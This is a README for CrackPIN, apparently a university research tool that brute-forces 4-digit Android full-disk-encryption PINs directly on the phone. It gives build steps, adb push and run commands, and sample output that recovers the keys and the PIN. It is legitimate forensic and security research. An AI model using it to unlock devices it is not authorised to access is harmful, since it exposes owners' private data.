# CrackPIN
##ARM binary to break Android FDE 4-digit PINs


PINs are still the most frequent screen lock in use today. Since long PINs are too
inconvient for most people, people commonly use short PINs of only 4 digits. That is
concerning, because in Android the screen lock PIN necessarily equals the PIN that is
used for disk encryption.

In 2012, Cannon et al. presented details about Android's encryption system
and gave instructions on how to break it with bruteforce attacks against the PIN.
They published their findings in form of a Python script that breaks Android
encryption on an `x86` PC after the `userdata` and `metadata` (crypto footer) partition
have been retrieved.
[See script.](https://github.com/santoku/Santoku-Linux/blob/master/tools/android/android_bruteforce_stdcrypto/bruteforce_stdcrypto.py)

Basically, we re-implemented the Python script in C and cross-compiled it for
ARM so that we can perform bruteforce attacks directly on the phone without
the need to download the user partition first. To this end, we make use of the
`PolarSSL` library for Android, an open source library similar to `OpenSSL` but more light-weight and easier to integrate.

We statically link our PIN cracking program with the PolarSSL library as Android does
not support dynamic linking out-of-the-box.


- Setup your cross-compiling environment and configure the `Makefile`, i.e., 
   change `${NDK}` to an appropriate path.


- Get `PolarSSL` library:

 - Get the source from [http://polarssl.org](http://polarssl.org). Enable `PBKDF2_C` in `include/polarssl/config.h` (disabled by default).
 - Cross-compile it manually for Android/ARM; Alternatively, simply use the pre-compiled `libpolarssl.a`, that is shipped with this package.
 

- Run `make`. The crackpin binary should appear in the `bin` directory.


- Boot your scrambled telephone into a rooted recovery image with `ADB` support,
   e.g., into clockwordmod recovery. Then upload crackpin:

	> adb push crackpin /etc/

- Run crackpin (this may take a while):

	> adb shell /etc/crackpin

- On success you see something like:

		> adb shell /etc/crackpin
			 
		magic number: D0B5B1C4
		major version: 1
		minor version: 0
		footer size: 104
		flags: 0
		key size: 16
		failed decrypts: 0
		
		encdek: 8789f6d998899713a4fb755ff29922d7
		salt: 54f422d3ce6e1f2bc2828963d59e0f1e
		
		...trying 0000
		...trying 0100
		...trying 0200
		...trying 0300
		...trying 0400
		...trying 0500
		...trying 0600
		...trying 0700
		...trying 0800
		...trying 0900
		...trying 1000
		...trying 1100
		...trying 1200
		...trying 1300
		...trying 1400
		...trying 1500
		...trying 1600
		...trying 1700
		...trying 1800
		...trying 1900
		...trying 2000
		...trying 2100
		...trying 2200
		...trying 2300
		
		KEK: bc0eca8b4f30edd0bf0892637b94affb
		IV:  ecfcfbe7a3c0c87c5e9e4a56891a680c
		DEK: 490af890f7d9d3b29155e80a786a509b
		
			    PIN: 2323


##Contact:

Tilo Müller ([tilo.mueller@informatik.uni-erlangen.de](mailto:tilo.mueller@informatik.uni-erlangen.de))

[http://www1.cs.fau.de/frost](http://www1.cs.fau.de/frost)
